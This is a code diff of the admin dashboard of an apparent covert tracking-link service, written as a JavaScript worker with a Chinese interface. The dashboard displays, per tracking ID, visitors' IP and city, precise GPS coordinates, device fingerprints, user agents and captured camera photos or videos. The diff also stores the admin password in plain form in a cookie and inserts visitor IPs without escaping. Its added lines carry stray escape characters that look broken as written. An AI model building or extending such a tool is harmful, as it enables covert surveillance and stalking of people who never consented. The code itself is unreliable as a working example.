+          "Set-Cookie": \`admin_auth=\${ADMIN_PASSWORD}; Path=/; HttpOnly; Max-Age=86400\`
         }
       });
     } else {
@@ -827,11 +926,11 @@ async function renderAdmin(request, env) {
   }
 
   const cookie = request.headers.get("Cookie") || "";
-  if (!cookie.includes(`admin_auth=${ADMIN_PASSWORD}`)) {
+  if (!cookie.includes(\`admin_auth=\${ADMIN_PASSWORD}\`)) {
     return renderAdminLogin();
   }
 
-  const { results } = await env.DB.prepare("SELECT * FROM sys_logs ORDER BY created_at DESC LIMIT 500").all();
+  const { results } = await env.DB.prepare("SELECT * FROM sys_logs ORDER BY created_at DESC LIMIT 1000").all();
 
   // 按 target_id 分组
   const groups = new Map();
@@ -842,87 +941,122 @@ async function renderAdmin(request, env) {
 
   let sectionsHtml = "";
   for (const [targetId, logs] of groups) {
-    // 组标题
-    sectionsHtml += `<div class="mb-6 bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden">
+    const visitLogs = logs.filter(l => l.event_type === 'VISIT');
+    sectionsHtml += \`<div class="mb-6 bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden">
       <div class="p-4 bg-indigo-50 border-b border-indigo-100 flex items-center justify-between">
-        <h2 class="text-lg font-bold text-indigo-900"><i class="fa-solid fa-fingerprint mr-2"></i>跟踪 ID：${escapeHtml(targetId)} <span class="text-sm text-gray-500 ml-2">(${logs.length} 条记录)</span></h2>
+        <h2 class="text-lg font-bold text-indigo-900"><i class="fa-solid fa-fingerprint mr-2"></i>跟踪 ID：\${escapeHtml(targetId)} <span class="text-sm text-gray-500 ml-2">(\${logs.length} 条记录)</span></h2>
+        <button onclick="deleteAllForTarget('\${targetId.replace(/'/g, "\\\\'")}')" class="px-3 py-1 text-sm bg-red-50 text-red-600 rounded hover:bg-red-100 transition"><i class="fa-solid fa-trash mr-1"></i>删除ID</button>
       </div>
-      <div class="overflow-x-auto">
-        <table class="w-full text-left border-collapse">
-          <thead class="bg-gray-50 border-b">
-            <tr>
-              <th class="p-4 text-sm font-semibold text-gray-600">事件 / 时间</th>
-              <th class="p-4 text-sm font-semibold text-gray-600">IP / 定位</th>
-              <th class="p-4 text-sm font-semibold text-gray-600">GPS</th>
-              <th class="p-4 text-sm font-semibold text-gray-600">媒体</th>
-              <th class="p-4 text-sm font-semibold text-gray-600">操作</th>
-            </tr>
-          </thead>
-          <tbody class="divide-y divide-gray-100">`;
+      <div class="space-y-2 p-4">
+\`;
 
-    for (const r of logs) {
-      let eventColor = r.event_type === 'GENERATE' ? 'bg-blue-100 text-blue-700' : (r.event_type === 'QUERY' ? 'bg-emerald-100 text-emerald-700' : (r.event_type === 'DELETE' ? 'bg-red-100 text-red-700' : 'bg-purple-100 text-purple-700'));
-      let eventIcon = r.event_type === 'GENERATE' ? 'fa-wand-magic' : (r.event_type === 'QUERY' ? 'fa-search' : (r.event_type === 'DELETE' ? 'fa-trash' : 'fa-crosshairs'));
+    // 按时间排序，分类显示
+    const eventLogs = {
+      GENERATE: logs.filter(l => l.event_type === 'GENERATE'),
+      VISIT: visitLogs,
+      QUERY: logs.filter(l => l.event_type === 'QUERY'),
+      DELETE: logs.filter(l => l.event_type === 'DELETE')
+    };
 
-      let ipInfo = {};
-      try { if (r.geo_info) ipInfo = JSON.parse(r.geo_info); } catch(e) {}
-      let geoStr = 'Geo Info Error';
-      if (ipInfo.ip) {
-        geoStr = (ipInfo.flag || '') + ' ' + (ipInfo.countryRegion || '') + ' ' + (ipInfo.city || '') + ' - ' + (ipInfo.asOrganization || '');
-      }
+    for (const [eventType, typeLogs] of Object.entries(eventLogs)) {
+      if (typeLogs.length === 0) continue;
+      
+      for (const log of typeLogs) {
+        let eventColor = eventType === 'GENERATE' ? 'bg-blue-100 text-blue-700' : 
+                        (eventType === 'QUERY' ? 'bg-emerald-100 text-emerald-700' : 
+                        (eventType === 'DELETE' ? 'bg-red-100 text-red-700' : 'bg-purple-100 text-purple-700'));
+        let eventIcon = eventType === 'GENERATE' ? 'fa-wand-magic' : 
+                       (eventType === 'QUERY' ? 'fa-search' : 
+                       (eventType === 'DELETE' ? 'fa-trash' : 'fa-crosshairs'));
 
-      let mediaBlock = '<span class="text-gray-400 text-xs">-</span>';
-      if (r.event_type === 'VISIT') {
-        if (r.status === 'denied') {
-          mediaBlock = '<span class="px-2 py-1 bg-red-100 text-red-600 rounded text-xs font-bold">拒绝权限</span>';
-        } else if (r.media_url) {
-          if (r.media_type === 'video') {
-            mediaBlock = `<button onclick="openMedia('video', '${escapeJs(r.media_url)}')" class="text-indigo-500 hover:underline text-xs"><i class="fa-solid fa-play-circle mr-1"></i>播放</button>`;
-          } else {
-            mediaBlock = `<button onclick="openMedia('image', '${escapeJs(r.media_url)}')" class="text-indigo-500 hover:underline"><img src="${escapeHtml(r.media_url)}" class="h-12 w-auto rounded hover:scale-150 transition-transform origin-left object-cover"></button>`;
+        let ipInfo = {};
+        try { if (log.geo_info) ipInfo = JSON.parse(log.geo_info); } catch(e) {}
+        let geoStr = 'Geo Info Error';
+        if (ipInfo.ip) {
+          geoStr = (ipInfo.flag || '') + ' ' + (ipInfo.countryRegion || '') + ' ' + (ipInfo.city || '') + ' - ' + (ipInfo.asOrganization || '');
+        }
+
+        let mediaBlock = '<span class="text-gray-400 text-xs">-</span>';
+        if (eventType === 'VISIT') {
+          if (log.status === 'denied') {
+            mediaBlock = '<span class="px-2 py-1 bg-red-100 text-red-600 rounded text-xs font-bold">拒绝权限</span>';
+          } else if (log.media_url) {
+            if (log.media_type === 'video') {
+              mediaBlock = \`<button onclick="openMedia('video', '\${escapeJs(log.media_url)}')" class="text-indigo-500 hover:underline text-xs"><i class="fa-solid fa-play-circle mr-1"></i>播放</button>\`;
+            } else {
+              mediaBlock = \`<button onclick="openMedia('image', '\${escapeJs(log.media_url)}')" class="text-indigo-500 hover:underline"><img src="\${escapeHtml(log.media_url)}" class="h-12 w-auto rounded hover:shadow-lg transition" style="max-width:100px"></button>\`;
+            }
           }
         }
-      }
 
-      let deviceGeoBlock = '<span class="text-gray-400 text-xs">-</span>';
-      if (r.device_geo) {
-         try {
-             const dGeo = JSON.parse(r.device_geo);
-             if (dGeo.denied) {
-                 deviceGeoBlock = '<span class="text-red-500 text-xs">拒绝定位</span>';
-             } else {
-                 deviceGeoBlock = '<div class="text-xs text-emerald-600 font-mono">' + dGeo.lat + ', ' + dGeo.lng + '</div>';
-             }
-         } catch(e) {}
-      }
+        let deviceGeoBlock = '<span class="text-gray-400 text-xs">-</span>';
+        if (log.device_geo) {
+          try {
+            const dGeo = JSON.parse(log.device_geo);
+            if (dGeo.denied) {
+              deviceGeoBlock = '<span class="text-red-500 text-xs">拒绝定位</span>';
+            } else {
+              deviceGeoBlock = '<div class="text-xs text-emerald-600 font-mono">' + Number(dGeo.lat).toFixed(6) + ', ' + Number(dGeo.lng).toFixed(6) + ' (精度:' + Math.round(dGeo.accuracy) + 'm)</div>';
+            }
+          } catch(e) {}
+        }
 
-      const burnedBadge = r.is_burned ? '<span class="ml-1 px-2 py-1 rounded text-[10px] font-bold bg-orange-100 text-orange-600">已焚毁</span>' : '';
-      const deletedBadge = r.is_deleted ? '<span class="ml-1 px-2 py-1 rounded text-[10px] font-bold bg-red-100 text-red-600">已删除</span>' : '';
-      const dateStr = new Date(r.created_at + 'Z').toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
+        let deviceInfoHtml = '<span class="text-gray-400 text-xs">-</span>';
+        if (log.device_info) {
+          try {
+            const devInfo = JSON.parse(log.device_info);
+            deviceInfoHtml = '<div class="text-xs text-gray-600"><div>' + devInfo.device + ' | ' + devInfo.screen + '</div><div>' + devInfo.language + ' | UTC' + devInfo.timezone + ' | CPU: ' + devInfo.hardwareConcurrency + '</div></div>';
+          } catch(e) {}
+        }
 
-      sectionsHtml += `<tr class="hover:bg-gray-50">
-        <td class="p-4">
-          <div class="flex items-center space-x-2 mb-1">
-            <span class="px-2 py-1 rounded text-[10px] font-bold ${eventColor}"><i class="fa-solid ${eventIcon} mr-1"></i>${r.event_type}</span>
-            ${burnedBadge}${deletedBadge}
+        const burnedBadge = log.is_burned ? '<span class="ml-1 px-2 py-1 rounded text-[10px] font-bold bg-orange-100 text-orange-600">已焚毁</span>' : '';
+        const deletedBadge = log.is_deleted ? '<span class="ml-1 px-2 py-1 rounded text-[10px] font-bold bg-red-100 text-red-600">已删除</span>' : '';
+        const dateStr = new Date(log.created_at + 'Z').toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
+        const visitorIp = log.visitor_ip || 'Unknown';
+
+        sectionsHtml += \`
+        <div class="bg-gray-50 p-3 rounded-lg border border-gray-200 hover:border-gray-300 transition">
+          <div class="flex justify-between items-start mb-2">
+            <div class="flex items-center gap-2">
+              <span class="px-2 py-1 rounded text-[10px] font-bold \${eventColor}"><i class="fa-solid \${eventIcon} mr-1"></i>\${eventType}</span>
+              \${burnedBadge}\${deletedBadge}
+            </div>
+            <div class="flex items-center gap-2">
+              <span class="text-xs text-gray-500"><i class="fa-regular fa-clock"></i> \${dateStr}</span>
+              <button onclick="deleteLog(\${log.id})" class="text-red-500 hover:text-red-700 text-xs"><i class="fa-solid fa-trash-can"></i></button>
+            </div>
           </div>
-          <div class="text-xs text-gray-500">${dateStr}</div>
-        </td>
-        <td class="p-4">
-          <div class="text-sm font-mono text-gray-800">${escapeHtml(r.ip)}</div>
-          <div class="text-xs text-gray-500 truncate max-w-xs" title="${escapeHtml(geoStr)}">${escapeHtml(geoStr)}</div>
-        </td>
-        <td class="p-4">${deviceGeoBlock}</td>
-        <td class="p-4">${mediaBlock}</td>
-        <td class="p-4">
-          <button onclick="deleteLog(${r.id})" class="text-red-500 hover:text-red-700 text-xs"><i class="fa-solid fa-trash-can"></i></button>
-        </td>
-      </tr>`;
+          <div class="grid grid-cols-4 gap-2 text-xs">
+            <div class="bg-white p-2 rounded border border-gray-200">
+              <div class="font-bold text-gray-700 mb-1">IP信息</div>
+              <div class="text-gray-600 break-words">\${visitorIp}</div>
+              <div class="text-gray-500 text-[10px] mt-1">\${escapeHtml(geoStr)}</div>
+            </div>
+            <div class="bg-white p-2 rounded border border-gray-200">
+              <div class="font-bold text-gray-700 mb-1">GPS定位</div>
+              \${deviceGeoBlock}
+            </div>
+            <div class="bg-white p-2 rounded border border-gray-200">
+              <div class="font-bold text-gray-700 mb-1">设备信息</div>
+              \${deviceInfoHtml}
+            </div>
+            <div class="bg-white p-2 rounded border border-gray-200">
+              <div class="font-bold text-gray-700 mb-1">媒体</div>
+              \${mediaBlock}
+            </div>
+          </div>
+          <div class="mt-2 p-2 bg-white rounded border border-gray-200 text-[10px] text-gray-600 truncate" title="\${escapeHtml(log.ua || '')}">
+            <i class="fa-brands fa-safari w-3"></i> \${escapeHtml((log.ua || 'Unknown').substring(0, 100))}...
+          </div>
+        </div>
+        \`;
+      }
     }
-    sectionsHtml += `</tbody></table></div></div>`;
+
+    sectionsHtml += '</div></div>';
   }
 
-  const html = `
+  const html = \`
   <!DOCTYPE html>
   <html lang="zh">
   <head>
@@ -939,15 +1073,14 @@ async function renderAdmin(request, env) {
     <div class="max-w-7xl mx-auto">
       <div class="flex justify-between items-center mb-6 bg-white p-6 rounded-2xl shadow-sm border border-gray-200">
         <h1 class="text-2xl font-bold text-gray-800"><i class="fa-solid fa-server text-indigo-600 mr-2"></i>全局事件审计日志</h1>
-        <div class="flex items-center space-x-4">
-          <span class="text-sm text-gray-500">最近 500 条记录（按ID时间轴分组）</span>
-          <button onclick="clearAll()" class="px-4 py-2 bg-red-600 text-white text-sm rounded-xl hover:bg-red-700 shadow">清空所有数据</button>
+        <div class="flex items-center gap-3">
+          <span class="text-sm text-gray-500">最近1000条记录 | 按ID分组时间轴</span>
+          <button onclick="clearAll()" class="px-4 py-2 bg-red-600 text-white text-sm rounded-xl hover:bg-red-700 shadow transition"><i class="fa-solid fa-exclamation-triangle mr-1"></i>清空所有</button>
         </div>
       </div>
-      ${sectionsHtml}
+      \${sectionsHtml}
     </div>
 
-    <!-- 媒体预览模态框 -->
     <div id="mediaModal" class="modal" onclick="this.classList.remove('active')">
       <div class="bg-white rounded-2xl p-4 max-w-3xl max-h-[90vh] overflow-auto shadow-2xl" onclick="event.stopPropagation()">
         <div id="mediaContent" class="flex items-center justify-center"></div>
@@ -965,12 +1098,24 @@ async function renderAdmin(request, env) {
         if (res.ok) location.reload();
         else alert('删除失败');
       }
+      
+      async function deleteAllForTarget(targetId) {
+        if (!confirm('确定删除此ID下的所有记录？')) return;
+        const res = await fetch('/admin/delete', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ target_id: targetId })
+        });
+        if (res.ok) location.reload();
+      }
+      
       async function clearAll() {
-        if (!confirm('此操作将清空所有日志和追踪配置，不可恢复！确定继续？')) return;
+        if (!confirm('此操作将清空所有数据库记录，不可恢复！确定继续？')) return;
         const res = await fetch('/admin/clear', { method: 'POST' });
         if (res.ok) location.reload();
         else alert('清空失败');
       }
+      
       function openMedia(type, url) {
         const modal = document.getElementById('mediaModal');
         const content = document.getElementById('mediaContent');
@@ -983,15 +1128,14 @@ async function renderAdmin(request, env) {
       }
     </script>
   </body>
-  </html>`;
+  </html>\`;
 
   return new Response(html, { headers: { "Content-Type": "text/html" } });
 }
 
-// 辅助转义函数
 function escapeHtml(text) {
   return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
 }
 function escapeJs(str) {
-  return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"');
+  return str.replace(/\\\\/g, '\\\\\\\\').replace(/'/g, "\\\\'").replace(/"/g, '\\\\"');
 }
